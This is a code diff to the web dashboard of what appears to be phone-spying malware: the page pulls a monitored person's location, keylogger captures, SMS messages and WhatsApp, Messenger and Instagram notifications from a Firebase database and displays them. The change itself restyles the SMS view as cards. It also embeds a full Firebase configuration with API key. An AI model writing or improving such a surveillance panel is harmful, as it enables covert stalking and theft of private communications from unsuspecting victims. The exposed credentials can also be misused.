@@ -340,39 +340,38 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* Updated SMS Bubble Styles */
-        .chat-container {
+        /* --- NEW SMS Card View Styles --- */
+        .sms-card-list {
             display: flex;
             flex-direction: column;
-            gap: 1rem;
-            padding: 1rem;
         }
-        .sms-bubble {
-            padding: 10px 15px;
-            border-radius: 18px;
-            max-width: 75%;
-            word-wrap: break-word;
+        .sms-card {
             background-color: var(--secondary-dark);
+            border-radius: 12px;
+            padding: 1rem;
+            border-left: 4px solid var(--text-secondary);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            margin-bottom: 1.5rem;
+        }
+        .sms-card:last-child {
+            margin-bottom: 0;
+        }
+        .sms-card.incoming { border-left-color: var(--accent-blue); }
+        .sms-card.outgoing { border-left-color: var(--accent-green); }
+        .sms-card-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 0.75rem; }
+        .sms-card-icon svg { width: 24px; height: 24px; }
+        .sms-card-address {
+            font-weight: 600;
             color: var(--text-primary);
+            word-wrap: break-word;
         }
-        .sms-bubble.incoming {
-            align-self: flex-start;
-            border-bottom-left-radius: 4px;
+        .sms-card-body {
+            line-height: 1.6;
+            color: var(--text-primary);
+            padding-left: 36px;
+            word-wrap: break-word;
         }
-        .sms-bubble.outgoing {
-            align-self: flex-end;
-            border-bottom-right-radius: 4px;
-        }
-        .sms-body {
-            font-size: 0.95rem;
-            line-height: 1.5;
-        }
-        .sms-meta {
-            font-size: 0.75rem;
-            opacity: 0.7;
-            margin-top: 5px;
-            text-align: right;
-        }
+        .sms-card-footer { text-align: right; font-size: 0.8rem; color: var(--text-secondary); margin-top: 0.75rem; }
         
         .notification-list { display: flex; flex-direction: column; gap: 1rem; }
         .notification-card { background-color: var(--secondary-dark); padding: 1rem; border-radius: 8px; }
@@ -593,14 +592,14 @@
 
         // Your NEW Firebase configuration
         const firebaseConfig = {
-          apiKey: "AIzaSyBZ-E4_1bI4YN-1pt6xyMNXq1tOAvx0GY0",
-          authDomain: "home-demo12-d5814.firebaseapp.com",
-          databaseURL: "https://home-demo12-d5814-default-rtdb.firebaseio.com",
-          projectId: "home-demo12-d5814",
-          storageBucket: "home-demo12-d5814.appspot.com",
-          messagingSenderId: "433464727867",
-          appId: "1:433464727867:web:731cc791eb8d48c5d9bf1e",
-          measurementId: "G-NHHB06Z9HT"
+         apiKey: "AIzaSyBZ-E4_1bI4YN-1pt6xyMNXq1tOAvx0GY0",
+         authDomain: "home-demo12-d5814.firebaseapp.com",
+         databaseURL: "https://home-demo12-d5814-default-rtdb.firebaseio.com",
+         projectId: "home-demo12-d5814",
+         storageBucket: "home-demo12-d5814.appspot.com",
+         messagingSenderId: "433464727867",
+         appId: "1:433464727867:web:731cc791eb8d48c5d9bf1e",
+         measurementId: "G-NHHB06Z9HT"
         };
 
         const app = initializeApp(firebaseConfig);
@@ -801,65 +800,80 @@
                 contentHTML = '<p>No data available in this category.</p>';
             } else {
                  switch(category) {
-                    case 'location':
-                        let mapLink = '';
-                        if (data.latitude && data.longitude) {
-                            mapLink = `<a href="https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
-                        }
-                        contentHTML = `<div class="location-card"><div class="location-item"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg><div class="location-item-content"><strong>Address</strong><span>${data.address || 'N/A'}</span></div></div><div class="location-item"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><div class="location-item-content"><strong>Time</strong><span>${data.dateTime || 'N/A'}</span></div></div>${mapLink}</div>`;
-                        break;
-                    case 'keylogger':
-                        contentHTML = '<div class="keylog-list">';
-                        Object.values(data).reverse().forEach(log => {
-                            if (log && log.keyText) {
-                                const parts = log.keyText.split(' |');
-                                const time = parts[0] || '';
-                                const action = (parts[1] || 'Action').replace(/[()]/g, '');
-                                const text = parts[2] || 'N/A';
-                                contentHTML += `
-                                    <div class="keylog-card">
-                                        <div class="keylog-header">
-                                            <div class="keylog-icon">
-                                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
-                                            </div>
-                                            <strong class="keylog-action">${action}</strong>
-                                        </div>
-                                        <p class="keylog-text">${text}</p>
-                                        <div class="keylog-footer">${time}</div>
-                                    </div>`;
-                            }
-                        });
-                        contentHTML += '</div>';
-                        break;
-                    case 'sms':
-                        contentHTML = '<div class="chat-container">';
+                     case 'location':
+                         let mapLink = '';
+                         if (data.latitude && data.longitude) {
+                             mapLink = `<a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
+                         }
+                         contentHTML = `<div class="location-card"><div class="location-item"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg><div class="location-item-content"><strong>Address</strong><span>${data.address || 'N/A'}</span></div></div><div class="location-item"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><div class="location-item-content"><strong>Time</strong><span>${data.dateTime || 'N/A'}</span></div></div>${mapLink}</div>`;
+                         break;
+                     case 'keylogger':
+                         contentHTML = '<div class="keylog-list">';
+                         Object.values(data).reverse().forEach(log => {
+                             if (log && log.keyText) {
+                                 const parts = log.keyText.split(' |');
+                                 const time = parts[0] || '';
+                                 const action = (parts[1] || 'Action').replace(/[()]/g, '');
+                                 const text = parts[2] || 'N/A';
+                                 contentHTML += `
+                                     <div class="keylog-card">
+                                         <div class="keylog-header">
+                                             <div class="keylog-icon">
+                                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
+                                             </div>
+                                             <strong class="keylog-action">${action}</strong>
+                                         </div>
+                                         <p class="keylog-text">${text}</p>
+                                         <div class="keylog-footer">${time}</div>
+                                     </div>`;
+                             }
+                         });
+                         contentHTML += '</div>';
+                         break;
+                     case 'sms':
+                        // --- EDITED SMS CODE ---
+                        contentHTML = '<div class="sms-card-list">';
                         Object.values(data).reverse().forEach(sms => {
                             if (sms) {
-                                const bubbleClass = sms.type === 2 ? 'outgoing' : 'incoming';
-                                contentHTML += `<div class="sms-bubble ${bubbleClass}"><div class="sms-body">${sms.smsBody || ''}</div><div class="sms-meta"><span>${sms.dateTime || ''}</span>${bubbleClass === 'incoming' ? `<span> from: ${sms.smsAddress || ''}</span>` : ''}</div></div>`;
+                                const isOutgoing = sms.type === 2;
+                                const cardClass = isOutgoing ? 'outgoing' : 'incoming';
+                                const icon = isOutgoing ?
+                                    `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="17" y1="7" x2="7" y2="17"></line><polyline points="17 17 7 17 7 7"></polyline></svg>` :
+                                    `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>`;
+                                const addressLabel = isOutgoing ? 'To:' : 'From:';
+                                contentHTML += `
+                                    <div class="sms-card ${cardClass}">
+                                        <div class="sms-card-header">
+                                            <div class="sms-card-icon">${icon}</div>
+                                            <div class="sms-card-address">${addressLabel} ${sms.smsAddress || 'N/A'}</div>
+                                        </div>
+                                        <div class="sms-card-body">${sms.smsBody || ''}</div>
+                                        <div class="sms-card-footer">${sms.dateTime || ''}</div>
+                                    </div>
+                                `;
                             }
                         });
                         contentHTML += '</div>';
                         break;
-                    case 'notifications':
-                        contentHTML = '<div class="notification-list">';
-                        Object.values(data).reverse().forEach(notif => {
-                            if (notif) {
-                                let appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>`;
-                                const fullText = `${notif.title || ''} ${notif.text || ''}`.toLowerCase();
-                                if (fullText.includes('whatsapp')) {
-                                    appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25D366"><path d="M19.78 4.22a10.4 10.4 0 0 0-14.9 0 10.4 10.4 0 0 0 0 14.9l-1.38 5.02 5.13-1.35a10.4 10.4 0 0 0 14.9 0 10.4 10.4 0 0 0 0-14.9zM12 20.9a8.8 8.8 0 0 1-4.5-1.2L4 21l1.3-3.5a8.8 8.8 0 1 1 6.7 3.4zM16.4 13.6c-.2-.1-.8-.4-1-.4s-.3-.1-.4.1-.4.4-.5.5-.2.1-.4 0c-.2-.1-1-1-1.8-1.8-.7-.6-1.1-1.4-.9-1.6s.2-.3.3-.4c.1-.1.2-.2.3-.3.1-.1 0-.2 0-.3s-1-2.3-1.3-3.2c-.3-.8-.6-1-.8-1s-.4-.1-.6-.1h-.3c-.2 0-.5.1-.7.3-.2.2-.8.8-1 2s-1.2 2.3-.9 3.3c.3 1 1.1 2.4 2.5 3.8 1.4 1.4 2.8 2.2 4.3 2.7 1.5.5 2.8.4 3.8.3.9-.1 2.3-1 2.6-1.9.3-.9.3-1.7.2-1.9s-.3-.3-.5-.4z"/></svg>`;
-                                } else if (fullText.includes('messenger')) {
-                                    appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="url(#messenger-gradient)"><defs><linearGradient id="messenger-gradient" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#00c6ff;stop-opacity:1" /><stop offset="100%" style="stop-color:#0072ff;stop-opacity:1" /></linearGradient></defs><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10c.83 0 1.63-.1 2.4-.3.4-.1.8.1.9.5.3.8.9 1.4 1.7 1.7.4.1.8-.1.9-.5.8-2.1.2-4.5-1.5-5.9C15.1 16.2 13.6 15 12 15c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3V9.5c0-1.93-1.57-3.5-3.5-3.5S8.5 7.57 8.5 9.5H12c.83 0 1.5.67 1.5 1.5s-.67 1.5-1.5 1.5H6v-2c0-3.31 2.69-6 6-6s6 2.69 6 6v5.5c0 2.04-1.21 3.83-3 4.65.2.03.4.05.6.05 5.52 0 10-4.48 10-10S17.52 2 12 2z"/></svg>`;
-                                } else if (fullText.includes('instagram')) {
-                                    appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><defs><radialGradient id="instagram-gradient" cx="30%" cy="107%" r="150%"><stop offset="0%" style="stop-color: #fdf497; stop-opacity: 1;" /><stop offset="5%" style="stop-color: #fdf497; stop-opacity: 1;" /><stop offset="45%" style="stop-color: #fd5949; stop-opacity: 1;" /><stop offset="60%" style="stop-color: #d6249f; stop-opacity: 1;" /><stop offset="90%" style="stop-color: #285AEB; stop-opacity: 1;" /></defs><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.85s-.011 3.584-.069 4.85c-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07s-3.584-.012-4.85-.07c-3.252-.148-4.771-1.691-4.919-4.919-.058-1.265-.069-1.645-.069-4.85s.011-3.584.069-4.85c.149-3.225 1.664-4.771 4.919-4.919C8.416 2.175 8.796 2.163 12 2.163zm0 1.44c-3.117 0-3.483.01-4.692.066-2.93.134-4.21 1.42-4.344 4.344-.056 1.21-.066 1.575-.066 4.692s.01 3.483.066 4.692c.134 2.923 1.414 4.21 4.344 4.344 1.21.056 1.575.066 4.692.066s3.483-.01 4.692-.066c2.93-.134 4.21-1.42 4.344-4.344.056-1.21.066-1.575.066-4.692s-.01-3.483-.066-4.692c-.134-2.923-1.414-4.21-4.344-4.344-1.21-.056-1.575-.066-4.692-.066zM12 6.883c-2.825 0-5.117 2.292-5.117 5.117s2.292 5.117 5.117 5.117 5.117-2.292 5.117-5.117-2.292-5.117-5.117-5.117zm0 8.792c-2.03 0-3.675-1.645-3.675-3.675s1.645-3.675 3.675-3.675 3.675 1.645 3.675 3.675-1.645 3.675-3.675 3.675zM18.833 6.167a1.44 1.44 0 1 1-2.88 0 1.44 1.44 0 0 1 2.88 0z" fill="url(#instagram-gradient)"/></svg>`;
-                                }
-                                contentHTML += `<div class="notification-card"><div class="notification-header"><div class="notification-icon">${appIcon}</div><strong class="notification-title">${notif.title || 'Notification'}</strong></div><p class="notification-body">${notif.text || ''}</p><div class="notification-footer">${notif.dateTime || ''}</div></div>`;
-                            }
-                        });
-                        contentHTML += '</div>';
-                        break;
-                }
+                     case 'notifications':
+                         contentHTML = '<div class="notification-list">';
+                         Object.values(data).reverse().forEach(notif => {
+                             if (notif) {
+                                 let appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>`;
+                                 const fullText = `${notif.title || ''} ${notif.text || ''}`.toLowerCase();
+                                 if (fullText.includes('whatsapp')) {
+                                     appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25D366"><path d="M19.78 4.22a10.4 10.4 0 0 0-14.9 0 10.4 10.4 0 0 0 0 14.9l-1.38 5.02 5.13-1.35a10.4 10.4 0 0 0 14.9 0 10.4 10.4 0 0 0 0-14.9zM12 20.9a8.8 8.8 0 0 1-4.5-1.2L4 21l1.3-3.5a8.8 8.8 0 1 1 6.7 3.4zM16.4 13.6c-.2-.1-.8-.4-1-.4s-.3-.1-.4.1-.4.4-.5.5-.2.1-.4 0c-.2-.1-1-1-1.8-1.8-.7-.6-1.1-1.4-.9-1.6s.2-.3.3-.4c.1-.1.2-.2.3-.3.1-.1 0-.2 0-.3s-1-2.3-1.3-3.2c-.3-.8-.6-1-.8-1s-.4-.1-.6-.1h-.3c-.2 0-.5.1-.7.3-.2.2-.8.8-1 2s-1.2 2.3-.9 3.3c.3 1 1.1 2.4 2.5 3.8 1.4 1.4 2.8 2.2 4.3 2.7 1.5.5 2.8.4 3.8.3.9-.1 2.3-1 2.6-1.9.3-.9.3-1.7.2-1.9s-.3-.3-.5-.4z"/></svg>`;
+                                 } else if (fullText.includes('messenger')) {
+                                     appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="url(#messenger-gradient)"><defs><linearGradient id="messenger-gradient" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#00c6ff;stop-opacity:1" /><stop offset="100%" style="stop-color:#0072ff;stop-opacity:1" /></linearGradient></defs><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10c.83 0 1.63-.1 2.4-.3.4-.1.8.1.9.5.3.8.9 1.4 1.7 1.7.4.1.8-.1.9-.5.8-2.1.2-4.5-1.5-5.9C15.1 16.2 13.6 15 12 15c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3V9.5c0-1.93-1.57-3.5-3.5-3.5S8.5 7.57 8.5 9.5H12c.83 0 1.5.67 1.5 1.5s-.67 1.5-1.5 1.5H6v-2c0-3.31 2.69-6 6-6s6 2.69 6 6v5.5c0 2.04-1.21 3.83-3 4.65.2.03.4.05.6.05 5.52 0 10-4.48 10-10S17.52 2 12 2z"/></svg>`;
+                                 } else if (fullText.includes('instagram')) {
+                                     appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><defs><radialGradient id="instagram-gradient" cx="30%" cy="107%" r="150%"><stop offset="0%" style="stop-color: #fdf497; stop-opacity: 1;" /><stop offset="5%" style="stop-color: #fdf497; stop-opacity: 1;" /><stop offset="45%" style="stop-color: #fd5949; stop-opacity: 1;" /><stop offset="60%" style="stop-color: #d6249f; stop-opacity: 1;" /><stop offset="90%" style="stop-color: #285AEB; stop-opacity: 1;" /></defs><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.85s-.011 3.584-.069 4.85c-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07s-3.584-.012-4.85-.07c-3.252-.148-4.771-1.691-4.919-4.919-.058-1.265-.069-1.645-.069-4.85s.011-3.584.069-4.85c.149-3.225 1.664-4.771 4.919-4.919C8.416 2.175 8.796 2.163 12 2.163zm0 1.44c-3.117 0-3.483.01-4.692.066-2.93.134-4.21 1.42-4.344 4.344-.056 1.21-.066 1.575-.066 4.692s.01 3.483.066 4.692c.134 2.923 1.414 4.21 4.344 4.344 1.21.056 1.575.066 4.692.066s3.483-.01 4.692-.066c2.93-.134 4.21-1.42 4.344-4.344.056-1.21.066-1.575.066-4.692s-.01-3.483-.066-4.692c-.134-2.923-1.414-4.21-4.344-4.344-1.21-.056-1.575-.066-4.692-.066zM12 6.883c-2.825 0-5.117 2.292-5.117 5.117s2.292 5.117 5.117 5.117 5.117-2.292 5.117-5.117-2.292-5.117-5.117-5.117zm0 8.792c-2.03 0-3.675-1.645-3.675-3.675s1.645-3.675 3.675-3.675 3.675 1.645 3.675 3.675-1.645 3.675-3.675 3.675zM18.833 6.167a1.44 1.44 0 1 1-2.88 0 1.44 1.44 0 0 1 2.88 0z" fill="url(#instagram-gradient)"/></svg>`;
+                                 }
+                                 contentHTML += `<div class="notification-card"><div class="notification-header"><div class="notification-icon">${appIcon}</div><strong class="notification-title">${notif.title || 'Notification'}</strong></div><p class="notification-body">${notif.text || ''}</p><div class="notification-footer">${notif.dateTime || ''}</div></div>`;
+                             }
+                         });
+                         contentHTML += '</div>';
+                         break;
+                 }
             }
             modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
         }
